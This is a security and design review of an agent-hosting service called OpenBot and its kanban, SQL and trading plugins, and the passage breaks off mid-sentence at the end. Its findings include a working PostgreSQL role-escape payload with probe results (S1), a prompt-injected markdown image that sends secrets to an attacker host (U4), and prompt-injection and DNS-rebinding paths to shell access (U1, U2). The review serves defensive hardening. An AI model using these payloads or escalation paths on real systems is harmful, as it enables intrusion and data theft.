## TL;DR: green light, with a short hardening pass first

**Yes, settings are the right next step, and the overall direction is sound.** The plugin model is
explicit and operator-configured. Plugins run in-process as trusted code with no installer or
marketplace. Each has its own migration history, there is no automatic dispatch, and the API adds no
new dependencies. That fits upstream's single-operator trust model and is a reasonable thing to
propose upstream. Three plugins already invent settings on their own:

- `openbot-sql` has its own access table and its own settings page.
- `openbot-trader` uses environment variables, `PLUGIN_CONFIG` and a check on a hard-coded handle.
- Core keeps an unvalidated `model_settings` bag on each bot.

That is the strongest argument for host-managed settings.

**But settings would freeze the current API shapes, so do a short "v1 hardening" pass first.**
Settings will be the most-used part of the plugin API. If they are built on the current surface, it
becomes permanent the moment a plugin is published.

Must fix before anything is published or proposed upstream:

1. **SQL plugin: escape from the restricted PostgreSQL role (verified, critical).** Any bot that has
   `sql_execute` on its own *private* space becomes the application's database login and can read and
   write OpenBot's core tables. No operator grant is needed. In devenv that login is a superuser.
   → [S1](#s1-critical-verified-a-bot-can-leave-the-restricted-postgresql-role)
2. **The PyPI name `openbot` belongs to an unrelated project** (`wwj718/openbot`, v0.1.0). All three
   plugins declare `dependencies = ["openbot>=0.1.0"]`, so `pip install openbot-kanban` from PyPI
   would install that stranger's package into the host environment. → [A2](#a2-packaging-the-pypi-name-is-taken)
3. **Narrow the API surface and namespace it while that is still cheap.** Specifically:
   - `RunContext.services: Any` leaks all of core.
   - Plugins look up hosts by an ID string, so any plugin can fetch any other plugin's host.
   - Plugins get `database_url` with credentials in it.
   - The SQL plugin reaches into `session_factory.kw["bind"]`.
   - Routes, events, tool names and index names are not namespaced.
   - `api_version` only allows an exact match.

   → [§4](#4-plugin-api-making-v1-future-proof)

Upstream flaws worth raising in parallel. None of them blocks the settings work, but one matters for it:

- **No authentication by default, and no Host-header check.** Any local process, or a website using
  DNS rebinding, can drive the API. That reaches `create_bot` with `run_shell`, i.e. remote code
  execution. → [U1](#u1-high-no-authentication-by-default-and-no-host-header-check)
- **`create_bot` grants have no upper bound.** The seeded `chief_of_staff`, which receives every
  unaddressed message, can create a bot with any tool and no approvals. Prompt injection therefore
  reaches the shell. → [U2](#u2-high-create_bot-lets-a-bot-create-a-more-powerful-bot)
- **This one matters for settings:** per-agent "capability" settings, such as SQL global read/write
  or paper-order submission, are only real if bots cannot reach the settings API. Today they can,
  unless `OPENBOT_API_KEY` is set and kept out of the shell's environment.
  → [U3](#u3-medium-bots-can-reach-the-api-over-loopback)

**Boards** (re your aside): they already live entirely in `openbot-kanban`. `b8de4f3` removed every
board file from core, the core migration head is back at `0022`, and a grep finds nothing left. The
only remnants are in history (`242643d`, `518cf34` and `3186013` add boards to core, then `b8de4f3`
removes them) and on the `github/feat/project-boards` branch, which still has core boards. Reshape
the series before upstreaming. → [§2](#2-our-changes)

**Compared with DeepSeek Harness (dsh) and dshcloud:** they are a different kind of product (an
interactive agent workstation, not a service hosting persistent bots), so there is no reason to
switch. dsh confirms two of our design choices: the task-board rule that updates never wake agents,
and settings forms generated from each plugin's schema. It suggests a few additions: a revision check
on settings writes, card dependencies for kanban, an ACP-backed bot provider, and a parallel fan-out
primitive. Its self-modifying "Creator mode" should not be copied into a service whose bots read
untrusted input. → [§7](#7-comparison-with-deepseek-harness-and-dshcloud)

## 1. Upstream OpenBot

### 1.1 Architecture

What it is:

- **Backend:** FastAPI, async SQLAlchemy and Alembic (SQLite or PostgreSQL), an actor runtime, and
  LangChain `create_agent` over a LangGraph checkpointer and store.
  - Actor runtime: each bot has its own inbox and exactly one worker, and a global semaphore caps
    concurrent runs.
  - Also included: an MCP manager, an in-process SSE event bus, a Telegram channel, a coding-agent
    CLI adapter (Claude Code), and a terminal client package.
  - Size: about 15.8k lines of source and 15.1k lines of tests.
- **Frontend:** a React 19 single-page app with React Query, plus an Electron shell.
  - About 18k lines, of which about 5.3k are the 3D "Openlings / Living Office" lab (three.js).

Strengths:

- The runtime model is documented unusually well. `docs/architecture.md` describes the intended
  model, what was actually built, and the gaps between them. The model itself is coherent: one run
  per bot, queued messages coalesced into one run, threads parked while waiting for a human, a hop
  limit, and held hand-offs.
- There is a strong test culture (871 tests) and both database dialects are exercised.
- Many details show security awareness:
  - `hmac.compare_digest` for the API key
  - Fernet-encrypted secrets that are masked in the API
  - the `SHELL_USER` and Docker separation design
  - the Electron window has `sandbox`, `contextIsolation` and a CSP
  - DOMPurify on rendered Markdown
  - the OAuth callback output is escaped
  - path-confined file tools
- The trust model is stated honestly in the README.

Structural weaknesses that matter for plugins and settings:

| # | Observation | Evidence | Why it matters to us |
|---|---|---|---|
| W1 | `Services` is an untyped bag (`Any` fields), and every tool receives it through `RunContext.services`. | `tools/context.py:16`, `services.py` | Plugins can and will reach into core internals, and every refactor upstream breaks them. The plugin API has to put a facade in front of it (A3). |
| W2 | Runtime settings work by calling `setattr` on the one global pydantic `Settings` object. Types are inferred from annotations by string matching (`"list" in str(ann)`). Keys are flat. Internal markers (`_setup_completed`, `_scratchpad_grant_done`) live in the same `app_settings` table. There are no scopes, namespaces or schema versions. | `runtime/app_settings.py` | Plugin settings must not be appended to `TUNABLES`; they need their own namespaced, scoped and versioned store (§5). The generic renderer in the UI (`groupSettings`, rendering by `type`) *is* reusable. |
| W3 | Per-bot `model_settings` is a JSON bag with almost no validation. It mixes tunables (`max_tokens`, `reasoning_effort`) with a security-relevant switch (Claude Code `permission: "edit"`), and bots can write it through `create_bot`. | `api/schemas.py:51`, `tools/builtin/bots.py` | Never store plugin per-agent settings here. |
| W4 | Authorization is done by comparing handle strings (`ctx.actor_handle == "chief_of_staff"`). | `tools/builtin/bot_profiles.py:20` | The trader plugin copies this pattern (`"market_coordinator"`). Per-agent settings are the proper replacement. |
| W5 | Core carries a lot of optional features: Telegram, CLI agents, the 3D lab, the terminal client. | — | This is the upstream pitch: a plugin API lets these, and the help-wanted Slack/Discord adapter (#146), move out of core. |
| W6 | State lives in two persistence systems: the application database, and the LangGraph checkpointer and store (a separate file on SQLite). | `runtime/persistence.py` | Plugin backup documentation has to mention both. |

### 1.2 Security

The README states plainly that this is a single trusted operator on their own machine: no login and
no sandbox. The findings below are measured against that model. They are not complaints that it
lacks multi-user security.

#### U1 (high): no authentication by default, and no Host-header check

- `.env.example:19` leaves `OPENBOT_API_KEY` empty, and none of `make dev`, `./openbot` or the Electron
  launcher generates a key. `require_api_key` accepts every request when no key is configured
  (`api/deps.py`).
- There is no `TrustedHostMiddleware` or Host allowlist in `main.py`. A malicious web page can use
  DNS rebinding to reach `127.0.0.1:8000` as a same-origin target. Browsers' local-network-access
  prompts mitigate this partly, and only in some browsers. Any other local user or process can always
  reach it.
- Consequence: `POST /bots` with `run_shell`, followed by a message to that bot, is remote code
  execution as the server user.
- Fix (small and upstreamable):
  - Launchers generate a random key per install or per launch. Electron hands it to the renderer
    through preload; the dev script exports it.
  - Reject any `Host` other than `127.0.0.1`, `localhost` or the host in `PUBLIC_URL`.

#### U2 (high): `create_bot` lets a bot create a more powerful bot

- `tools/builtin/bots.py:16` accepts any registered tool in `tool_names`, any `approval_tools`
  (including none), and any `model_settings`. Registered tools include `run_shell`, `http_request`
  and plugin tools such as `sql_execute` and `paper_execute`; `model_settings` includes Claude Code
  `permission: "edit"`.
- The seeded `chief_of_staff` has `create_bot` and `update_bot_instructions` and no approvals
  (`seed.py:63`). It is also the default recipient of every human message without a mention, and of
  external-actor and Telegram messages.
- Consequence: a prompt injection that reaches the chief leads to a new bot with a shell. The
  injected chief can also rewrite the engineer's instructions, and the engineer has `run_shell`.
- Fix: a created bot's tools must be a subset of its creator's tools, and its approvals a superset of
  its creator's. Alternatively, always require approval for `create_bot` and `update_bot_*`. This
  matters more once plugins add powerful tools.

#### U3 (medium): bots can reach the API over loopback

This is documented in the README. Without `SHELL_USER`, `run_shell` inherits the server's whole
environment, `OPENBOT_API_KEY` included (`tools/builtin/shell.py:74-88`). `http_request` can call
`localhost` freely.

**Relevance to us:** any setting meant to be operator-only, such as "this agent may write to the
global SQL space" or "this agent may submit paper orders", can be granted by a bot to itself unless
the API key is set *and* kept out of the shell's environment. The settings design (§5) should say so,
and the U1 fix makes it hold by default.

#### U4 (medium): the browser build has no CSP, so remote images can leak data

`MarkdownContent` passes `<img src=https://…>` through DOMPurify unchanged
(`frontend/src/components/MarkdownContent.tsx:24-30`). A bot reply injected by a prompt, such as
`![](https://attacker/?q=<secret>)`, loads that URL as soon as a human opens the thread in the
browser. Electron sets `img-src 'self' data: blob:` (`electron/security.cjs:52`), but FastAPI serves
the single-page app with no CSP.

Fix: send the same CSP from the backend, or drop remote images in `MarkdownContent`. Plugins that use
the exported `MarkdownContent` inherit the fix.

#### Lower-severity findings

- **U5 (low):** the `?api_key=` query-string fallback for SSE is documented. A short-lived SSE ticket
  would remove it.
- **U6 (low):** the secret key file is written and then `chmod`ed (`runtime/secrets.py:29-30` and
  `:50-51`). For a moment it carries umask permissions. Use `os.open(..., O_CREAT|O_EXCL, 0o600)`.
- **U7 (info):** `run_shell` is not sandboxed, and `http_request`/`fetch_url` are unrestricted. Both
  are documented; per-command sandboxing is upstream #145.

### 1.3 Third-party dependencies

The goal is few third-party dependencies.

**Python:** 26 direct runtime dependencies, which resolve to **93 transitive runtime packages** (102
are locked including dev). The weight comes from the LangChain ecosystem:

- `langchain`, `langchain-core`, `langgraph` with checkpoint-sqlite, checkpoint-postgres, prebuilt,
  sdk and protocol, `langchain-openai`, `-anthropic`, `-ollama` and `-mcp-adapters`.
- `langmem` **0.0.30**, which is pre-1.0 and pulls in `trustcall` and `dydantic`. `trustcall` already
  triggers a `LangGraphDeprecatedSinceV10` warning in the test run.
- `langsmith`, which `langchain-core` always installs; it brings `requests`, `requests-toolbelt`,
  `zstandard`, `orjson`, `xxhash` and `uuid-utils`.
- **Three HTTP stacks in one process:**
  - `httpx`/`httpcore`, used by langchain-core, mcp, ollama and OpenBot itself
  - `httpx2`/`httpcore2`, used by openai, anthropic, langsmith and `runtime/retry.py`
  - `requests`/`urllib3`, used by langsmith and tiktoken
- **Native wheels:** psycopg-binary (bundles libpq and OpenSSL), sqlite-vec, cryptography, tiktoken,
  regex, orjson, zstandard, xxhash, uvloop, httptools, watchfiles, pydantic-core, rpds-py, jiter,
  ormsgpack.

**Frontend runtime:** 9 dependencies: react, react-dom, react-router-dom, react-query, marked,
dompurify, three and two font packages. That is lean. `three` exists only for the 3D lab. The dev
toolchain locks 443 packages, mostly Electron and electron-builder.

Realistic levers. LangChain itself cannot be removed without rewriting the runtime.

- Optional extras such as `openbot[postgres]`, `[ollama]` and `[anthropic]`.
- Split the terminal client (`click`) into its own distribution.
- Watch `langmem`; it is the least stable dependency.
- Move `three` into a lazily loaded chunk or a plugin.

**Our side:**

- kanban and sql add **zero** dependencies; trader pins only `ib_async==2.1.0`. Keep it that way. The
  plugin API must never require new host dependencies.
- `9facb49` made `psycopg[binary]` an unconditional dependency. psycopg was already pulled in through
  `langgraph-checkpoint-postgres`, but the binary wheel is new. Propose it upstream as the
  `[postgres]` extra.

## 3. Plugins

### 3.1 openbot-kanban

Good:

- Optimistic concurrency through `expected_version`, and an atomic claim (a versioned `UPDATE` with a
  `rowcount` check).
- The audit event is written in the same transaction as the change.
- Identity comes from the tool's runtime context, never from model arguments.
- UI and tools share one set of operations, there are no dispatch side effects, migrations work on
  both dialects, and tables carry the `kanban_` prefix.

Issues:

- **K1 Namespacing.**
  - The route prefix is `/boards` (`api.py:16`), not the plugin ID.
  - The event is `board.updated` (`operations.py:241`).
  - The tools are named `board_*` and `card_*`.
  - The index `ix_board_cards_board_status` has no prefix (`0001_initial.py:38`). PostgreSQL index
    names are unique per schema, and the old core migration 0023 used similar names.

  Fine for one plugin; with third-party plugins, collisions are certain. The host should enforce
  namespacing (A4).
- **K2** `X-OpenBot-Actor` is a header that anyone can set. Any API caller, including a bot with
  `http_request`, can act as any actor. The README documents it correctly as an audit field. Keep it
  out of authorization decisions.
- **K3** `BoardError` subclasses FastAPI's `HTTPException` and is also used inside tools. That
  couples the domain code to the web framework. Minor.
- **K4** The README still contains fork-specific steps for resetting the migration marker from 0023
  to 0022 (`README.md:37`). Remove them before publishing.
- **K5** Because of a host limitation, the plugin gets exactly one page and no sub-routes, so it
  falls back to search parameters (A7).
- **K6 (enhancement, from §7)** Add card dependencies (`blocked_by`, kept acyclic, with a derived
  "ready" flag) and optional advisory write scopes (path prefixes, with a warning when two in-progress
  cards overlap). dsh's Agent Teams task board has both. They make the board usable for planning, not
  just tracking. Both are additive changes in a plugin migration.

### 3.2 openbot-sql

#### S1 (critical, verified): a bot can leave the restricted PostgreSQL role

`storage.py` isolates spaces with `SET LOCAL ROLE <space role>` on the application's own pooled
connection (`storage.py:171-175`). `SET ROLE` is checked against the **session user**, which is still
the application login and is a member of every space role. A command filter sits in front of this:
`statement()` allows only certain first keywords and rejects literal `set_config`
(`storage.py:61`). PostgreSQL Unicode-escaped identifiers get straight past that regex:

```sql
SELECT U&"\0073et_config"('role', session_user::text, true)
```

The probe ran this against a throwaway database through `openbot_sql.storage.execute`, the code path
behind `sql_execute`, on a bot's **private** space with no operator grant:

| Step | Result |
|---|---|
| Baseline identity | `current_user = obs_…_r` (the reader role), `session_user = self` (the login; a superuser in devenv) |
| `SELECT count(*) FROM public.actors` | `permission denied` (what the plugin's own tests check) |
| Literal `set_config(...)` | rejected by the regex |
| Escaped `set_config`, then `SELECT … FROM public.actors`, then `UPDATE public.actors SET name='pwned'` in one batch | **all succeeded**; `current_user` became `self`; the core row was changed |

What an attacker gets:

- Full read and write access to OpenBot's database. Changing `bot_profiles.tool_names` grants
  `run_shell`; the stored secrets can be read, although they are Fernet-encrypted.
- When the login is a superuser, as in devenv, server-side program execution through
  `COPY … TO PROGRAM`.
- In production the login must have `CREATEROLE` (README). On PostgreSQL 15 and earlier that is
  close to superuser.

The plugin's PostgreSQL tests all pass, so this is a test gap.

A related risk I did **not** verify: `set_config(..., false)` sets the role for the whole session,
and the pooled connection keeps it after commit. Core queries could then run as a restricted role on
that connection, which would be a denial of service.

Fix direction:

- **Do not use `SET ROLE` as a security boundary.** Run space queries over a separate engine whose
  *login* is the restricted role, so that `session_user` is restricted: one `LOGIN` role per space, or
  one restricted login with grants per schema. Generate their passwords and store them encrypted with
  the host's secret box.
- Do the provisioning (`CREATEROLE`) through a separate, optional admin URL or a one-time operator
  command. The application login should not need `CREATEROLE`.
- Keep the keyword and regex filter only as a convenience. Add regression tests for `U&"…"`
  identifiers, `RESET ROLE`, `SET SESSION AUTHORIZATION` and session-level `set_config`.
- Until it is fixed, do not grant `sql_execute` or `sql_query` on PostgreSQL deployments.
  `openbot-trader`'s bootstrap grants both to all three bots (`bootstrap.py:210`).

#### Other SQL findings

- **S2** The SQLite path looks sound:
  - each space is a separate file
  - queries open the file with `mode=ro`
  - an authorizer denies `ATTACH`, `DETACH` and `PRAGMA`
  - a progress handler enforces a deadline
  - extension loading is off, which is Python's default

  Minor: `with sqlite3.connect(...) as init` commits but does not close the connection, and the WAL
  pragma runs on every call.
- **S3** It uses host internals: `host.session_factory.kw["bind"]` and `host.database_url`, which
  contains credentials, to derive names. The API should offer `host.engine` (or `host.connect()`),
  `host.dialect` and `host.database_name` instead (A3).
- **S4** Access grants live in a table the plugin owns, edited on a page the plugin builds. That makes
  this plugin the ideal **first consumer of per-agent settings** (§5).

### 3.3 openbot-trader

Good:

- The domain stays out of the host.
- Artifacts are content-addressed and checked for integrity before use, and bound to their thread.
- The critic must be a different actor from the author.
- Paper-only safeguards: the account must have the `DU` prefix, the order connection is fixed to the
  paper port, and the intent journal is serialized with `flock` and written before any broker call.
- Submissions are off by default.
- Subprocesses get a minimal environment with no secrets.

Issues:

- **T1** Authorization by handle: `actor_handle != "market_coordinator"` (`tools.py:307`). Any bot
  that later gets this handle inherits the right to place orders; `create_bot` can mint it after a
  deletion. A per-agent setting `paper_trading: off | preview | submit` is the right fix.
- **T2** Global configuration is scattered across process environment variables
  (`PAPER_SUBMISSIONS_ENABLED`, `PAPER_ALLOW_DELAYED`, `IB_EVIDENCE_COMMAND`, `PAPER_GATEWAY_COMMAND`,
  `RESEARCH_STATE_DIR`) and `PLUGIN_CONFIG.trader.state_dir`. These map directly onto global settings
  that the environment can lock (§5).
- **T3** The bootstrap grants `paper_execute` without listing it in `approval_tools`, and the prompt
  tells the coordinator to submit on its own. That is acceptable for paper trading, but a published
  default should require approval.
- **T4** The bootstrap grants `sql_*` to all three bots, which exposes them to S1.
- **T5** It depends on the kanban REST route (`/boards`) and tool names through
  `requires=("kanban","sql")`, with no version constraint (A1).
- **T6** The state directory is passed around through a `ContextVar` that is set per tool call
  (`tools.py:32`). That is fragile; resolve it from the host each time.
- **T7** The prompts include "restrained Tolkien-like phrasing", which follows upstream's `AGENTS.md`
  ("All bots must talk in the style of Lord of the Rings characters"). Upstream's own seeded bots do
  not follow that rule, and it arrived in an unrelated upstream commit (`b1c6f5a`, #290). Ask
  upstream what they intend before baking it into published plugin prompts.

## 4. Plugin API: making v1 future-proof

These are the changes I would make **before** adding settings or publishing anything. Each is small
now and a breaking change later.

### A1 Versioning

- `api_version != 1` is an exact match. Every addition then forces a choice between a new major
  version and silent incompatibility.
- Export `openbot.plugin_api.API_VERSION = (1, <minor>)`. Plugins declare the minimum they need
  (`api_version=(1, 2)`). The host accepts the same major version with a minor no higher than its own.
  Use the same scheme for the frontend (`apiVersion`).
- Add `Plugin.version` (the package version) and an optional `name` and `description`.
- Let `requires` take version constraints (`{"kanban": ">=0.2"}`).
- Add `GET /api/v1/plugins`: the loaded plugins, their versions, their settings schemas, and whether
  each has a frontend. The UI needs this; so do support requests.

### A2 Packaging: the PyPI name is taken

- `openbot` on PyPI is someone else's project (`wwj718/openbot` 0.1.0). Upstream does not publish to
  PyPI.
- Before publishing anything:
  - **Either** agree a distribution name with upstream and claim it, **or** publish a tiny
    `openbot-plugin-api` stub (protocols and types, no implementation) that plugins depend on as
    `>=1,<2`.
  - Until then, do not declare `openbot` as a dependency in published packages.
- Consider an entry-point group, `[project.entry-points."openbot.plugins"]`, so that
  `PLUGIN_MODULES` can list plugin IDs. Enabling a plugin should stay an explicit operator action.

### A3 A narrower, stable surface

- **Stop re-exporting `RunContext`.** Its field list, including `services: Any`, `shell_user` and the
  output caps, then becomes API. Export a `ToolContext` with only what plugins need (`actor_id`,
  `actor_handle`, `thread_id`, `run_id`, `working_directory`). Get it through
  `plugin_api.tool_context(runtime)`.
- **Bind the host to the calling plugin** instead of taking `host_from_*(…, "id")`. For example,
  `plugin_api.host(runtime)` resolves the plugin from the tool's registered source, and routes use
  `Depends(plugin.host)`. Today any plugin can fetch any other plugin's host, and both helpers depend
  on the internal layout `request.app.state.services` and `runtime.context.services`.
- **Do not hand out `database_url`.** Offer `dialect`, `database_name`, and `engine` or `connect()`.
  That removes `session_factory.kw["bind"]`.
- Type `publish`, `lifespan` and the `config` and `state` members. Make `PluginHost` a class that only
  accepts keyword arguments, or a Protocol, so fields can be added later.
- Keep the small helpers (`find_actor`, `thread_exists`, `ActorRef`, `ModelBase` with ID-only foreign
  key stubs). They are well chosen.

### A4 Namespacing, enforced by the host

- **Routes:** mount under `/api/v1/plugins/<id>/…`, or at least require `router.prefix == "/<id>"`.
  The current check only catches exact `(path, method)` duplicates. Parameterized routes from two
  plugins can still shadow each other.
- **Events:** `publish` should enforce `^<id>\.[a-z0-9_.]+$`. That also rules out newlines in the SSE
  `event:` line.
- **Tools:** require a `<id>_` prefix, or at least show the plugin source in the bot editor.
- **Database objects:** after a plugin migration runs, inspect the new tables and indexes and warn on
  any without `<id>_`.

### A5 Coupling to core tables

- Bots are hard-deleted (`api/bots.py:195`) and SQLite enforces foreign keys (`PRAGMA foreign_keys=ON`).
  A plugin foreign key to `actors`/`threads` without `ON DELETE CASCADE` or `SET NULL` therefore
  makes core bot deletion fail on both dialects.
- Kanban and SQL get this right, but the API should state the rule, or better, emit host lifecycle
  events (`actor.deleted`, `thread.deleted`).
- Per-agent settings stored in core with a cascade (§5) remove the most common reason for plugins to
  reference `actors` at all.

### A6 Load plugins once

- `load_plugins` runs in `tools/registry.py:100`, `main.py:327` and `plugins.py:37`.
- Routes come from `create_app(settings)`, hosts from `services.settings`. When the two differ, as
  with injected services in tests, a route can exist without a host, which raises `KeyError`.
- Load once into `services.plugins`, then feed that list to the registry, the routers, the lifecycle,
  and later the settings.

### A7 Frontend

- **Build-time compilation is the biggest barrier to "publish the plugins".** The upstream Electron
  release and the Docker image cannot use a published plugin's UI unless the user rebuilds the
  frontend. Plan runtime loading for v1.x:
  - a backend plugin ships a prebuilt ES module
  - the host serves it at `/api/v1/plugins/<id>/ui.js` (or under `/plugins/`)
  - shared dependencies come from the host through an import map or a `window` SDK object

  The trust level is the same as for backend plugin code. Because the module comes from the host's
  own origin, `script-src 'self'` still holds. dsh already works this way: its
  `cordis-client-runner` evaluates a plugin's browser half at runtime (§7), so the approach is proven
  in a large codebase.
- **Schema-driven settings** (§5) let many plugins ship no frontend code at all. That is a strong
  reason to make settings host-managed.
- Allow sub-routes (`path: "/boards/*"`), and let plugins choose a nav icon and position. Every plugin
  currently gets `ThreadsIcon`.
- Add a slot for settings and bot-editor panels, for the rare plugin that needs a custom UI.
- The SDK re-exports internal UI components (`Button`, `Dialog`, …). Their props become API. Either
  document and version a small set, or mark them unstable.
- At runtime, compare the compiled frontend plugin set with `/api/v1/plugins` and hide pages whose
  backend plugin is not loaded.

### A8 Identity and future accounts

- Upstream's roadmap includes accounts and more than one human. `X-OpenBot-Actor` is not
  authentication.
- Design settings scopes as an enum (`global`, `agent`, later `user`/`thread`) instead of two
  hard-wired tables, so the API never needs reshaping later.

## 5. Settings extension: recommended design

The principle: **the plugin declares a schema; the host owns storage, validation, encryption,
precedence, API, UI and audit.**

```python
from typing import Literal
from pydantic import BaseModel, Field, SecretStr
from openbot.plugin_api import Plugin, PluginSettings, host, tool_context

class TraderGlobal(BaseModel):
    submissions_enabled: bool = Field(False, title="Submit paper orders",
                                      description="Off: preview only.")
    allow_delayed_quotes: bool = False
    gateway_command: str | None = Field(None, json_schema_extra={"env": "PAPER_GATEWAY_COMMAND"})
    broker_token: SecretStr | None = None                 # encrypted at rest, masked in the API

class TraderAgent(BaseModel):
    paper_trading: Literal["off", "preview", "submit"] = Field(
        "off", json_schema_extra={"capability": True})   # operator-only, highlighted in the UI

plugin = Plugin(id="trader", api_version=(1, 1),
                settings=PluginSettings(global_=TraderGlobal, agent=TraderAgent, version=1,
                                        migrate=None))   # (old_version, dict) -> dict

@tool
async def paper_execute(analysis_id: str, quantity: int, runtime: ToolRuntime) -> str:
    h, ctx = host(runtime), tool_context(runtime)
    if (await h.settings.for_agent(ctx.actor_id)).paper_trading != "submit":
        return "Error: this agent may not submit paper orders"
    ...
```

Rules I would fix in v1:

1. **The schema is a Pydantic model.** The host derives JSON Schema from it, so types, defaults,
   bounds, enums, titles and descriptions all come for free. A generic renderer handles bool, number,
   string, enum, list and secret; it is the existing `SettingsGroupCard` logic, driven by the schema.
   A custom component is an optional, later frontend slot.
2. **Store one document per (plugin, scope, subject)**, not one row per key:
   `plugin_settings(plugin_id, scope, subject_id NULL | actors.id ON DELETE CASCADE, schema_version,
   revision, value JSON, updated_at, updated_by)`.
   - Whole-document validation allows cross-field rules and simple migrations.
   - Every read returns `revision`. Every write sends `expected_revision` and gets `409` when it is
     stale, so two editors (say, the UI and an operator script) cannot silently overwrite each other.
   - Offer both a merge (`PATCH`) and a full replace (`PUT`, which resets omitted fields to their
     defaults). dsh's settings service makes the same two distinctions (§7).
   - The table is core-owned and created by a core migration.
   - Values marked `SecretStr` or `secret` are encrypted with `SecretBox`. Reads return the existing
     `MASK`, and writing `MASK` back is a no-op, exactly as core settings behave today.
3. **Precedence, defined now:** environment or `PLUGIN_CONFIG` > stored value > schema default.
   - Values supplied by the environment show as "locked by deployment" and are read-only in the UI.
     This inverts core's current rule (stored > environment), on purpose: deployment pins must win
     over values clicked in the UI. If upstream prefers its order, make it a per-field flag, but
     decide before publishing.
   - `PLUGIN_CONFIG` becomes the deployment-pin mechanism instead of a parallel config channel.
4. **Validate on write and tolerate on read.** If a stored document no longer validates after a
   plugin upgrade, keep the stored data, run the effective value from defaults, and flag the problem
   in `/api/v1/plugins`. Run `migrate(old_version, data)` on load.
5. **Change notification:** publish `<id>.settings.updated`, and offer an optional
   `on_settings_changed(host, scope, subject)` hook for plugins with caches or connections. Reading
   per call is cheap; cache in the host with invalidation.
6. **Who may write:** only the operator API, via `GET`/`PATCH /api/v1/plugins/<id>/settings` and
   `GET`/`PATCH /api/v1/bots/<bot_id>/plugin-settings/<id>`.
   - Never through `create_bot`, the `update_bot_*` tools or `model_settings`.
   - Fields marked `capability` are listed in the bot editor and in the bot list, so the operator can
     see what each agent is allowed to do.
   - Document that the guarantee depends on U1 and U3 (API key set, and kept out of the shell's
     environment).
7. **Lifecycle:**
   - A disabled plugin keeps its settings; they are hidden and reported as orphaned.
   - Deleting an agent cascades to its settings.
   - Bot export, catalog and sync include non-secret per-agent plugin settings only if the plugin opts
     in.
8. **Core symmetry, which is the upstream pitch:** make core `TUNABLES` and a typed `model_settings`
   schema producers in the same registry, under the IDs `core` or `model`. Then there is one
   mechanism rather than two, which gives upstream a reason to accept it. That also fixes W2 and W3.
9. **UI:**
   - Settings gets a "Plugins" section with one card per plugin.
   - The bot editor gets a collapsible section per plugin. Show it when the bot has one of the
     plugin's tools, or always for capability fields.
   - The SQL plugin's bespoke page and its `sql_space_access` table go away. Migrate the table's rows
     once with a plugin data migration.
10. **Avoid:** one row per key, settings stored inside `bot_profiles.model_settings`, free-form dicts,
    settings that bots can write, and settings that live only in plugin-owned tables. Each of these is
    a pattern we would have to support forever.

First consumers, which also validate the design:

- **sql:** per-agent `global_access: off | ro | rw`.
- **trader:** global submission and delayed-quote flags and command paths, environment-lockable, plus
  per-agent `paper_trading`, which replaces the handle check (T1).
- **kanban:** nothing needed yet. Perhaps a per-agent default board later.

## 7. Comparison with DeepSeek Harness and dshcloud

What they are:

- **DeepSeek Harness (dsh)** is DeepSeek's open-source (MIT) agent harness, positioned as a rival to
  Claude Code. It is built on the Cordis framework, where every part, the agent loop included, is a
  plugin. It runs as a local web UI, a desktop app or a CLI.
- **dshcloud** is a community project with one maintainer, not a DeepSeek product. It hosts dsh
  workspaces for several users on one Linux server. I found no official hosted "DSH Cloud".

### 7.1 Multi-agent features

| | OpenBot + our plugins | dsh |
|---|---|---|
| Agent identity | Persistent, named bots with inboxes. Humans and external systems take part in the same threads. | Agents are spawned per session, in a tree under a lead (any depth). Fresh children can use a different preset. |
| Coordination | Hand-off by @mention. A bot reply wakes one bot; there is a hop limit and held hand-offs. Delegation is sequential; a bot cannot fan out. | Parallel fan-out. Children can start with the parent's history, return results against an output schema, and be messaged, interrupted or waited on. |
| Shared work state | Kanban boards (atomic claims, version checks, audit) and SQL spaces, shared across all threads and kept indefinitely. | Agent Teams: a task graph with blockers, version checks and advisory write scopes, scoped to one root session. |
| Memory | Long-term memory per bot, plus a scratchpad. | Persona presets per agent. I found no long-term memory package. |
| External agents | Claude Code as a bot provider. | Claude Code, Codex, ACP agents and the dsh SDK as subagent providers. Also git worktrees, workflows, goal loops and schedules. |
| Channels | Telegram, webhooks to external actors, scheduled runs. | Schedules; GitHub webhooks (experimental). |

dsh is stronger at orchestration within one task: parallel subagents, structured results,
worktrees. OpenBot is stronger as a standing team: persistent identities, mailboxes, humans and
external systems as participants, and memory that spans threads.

### 7.2 Self-modification

The two take opposite positions.

- **dsh makes it a feature.**
  - In "Creator mode" the agent inspects the runtime API and writes plugin bundles.
  - It installs them with the `plugin_manager` tool, and hot reload activates them in the session
    that is already running.
  - A separate package tells the agent where the harness's own source checkout and web UI are, so it
    can work on dsh itself.
  - dsh's `SAFETY.md` says it "has not undergone a security audit and must not be treated as
    secure".
- **OpenBot treats it as a risk.**
  - Our plugin API deliberately has no installer and no way for agents to enable plugins themselves.
    Changes need a restart, plus a frontend rebuild for UI changes.
  - Upstream's `create_bot` and `update_bot_instructions` are the self-modification that exists
    today, and they are the escalation path in U2.

### 7.3 Maturity

| | Signals | Assessment |
|---|---|---|
| dsh | Created 2026-08-13; PR numbers pass 7,800; about 20.7k files and about 70 MB of TypeScript; docs in English and Chinese with generated API catalogs, benchmarks, and an arXiv prompt-injection assessment. Every release so far is a prerelease (now `0.2.2-rc.1`), labelled "developer preview — THERE WILL BE COMPATIBILITY-BREAKING CHANGES". 13 upgrade guides and four session-format migrations so far. | Very deep engineering, unstable API. The 275k stars measure attention, not quality. |
| dshcloud | One maintainer, 97 stars, `v0.1.15`, last push 2026-09-20 (silent while dsh kept making breaking changes). README: "testing on a fresh Linux installation … only. Do not use in production." The installer edits `/etc/fstab`, binds ports 80 and 443, and runs a node agent with the Docker socket and `CAP_SYS_ADMIN`, which its own docs call equivalent to host root. | Early hobby project. It does have what OpenBot lacks entirely: users added by invitation, one container per workspace with CPU, memory and disk quotas, and image-based upgrades with snapshots. |
| OpenBot + ours | Small upstream team (41 stars). 871 backend and 444 frontend tests, desktop releases, single operator with no login by default. Our fork adds 8 commits and 3 plugins (about 3.3k lines); tests pass, with one open critical bug (S1). | Smaller and young as well, but tested, with a stable product shape. |

### 7.4 Recommendations

- **R1 Settings: add revision checks.** dsh's settings forms are generated from each plugin's
  schema. They validate the whole config on every write, keep secrets that the client did not send
  back, and refuse writes against a stale revision. That confirms §5; the revision check is now
  part of rule 2 there.
- **R2 Kanban: dependencies and write scopes** (K6). dsh's task board also confirms our wake rule.
  Its docs say task changes do not "start idle agents. Send an explicit message", which is the
  kanban plugin's rule too.
- **R3 Parallel fan-out (design first).** OpenBot cannot have a bot hand several sub-tasks to
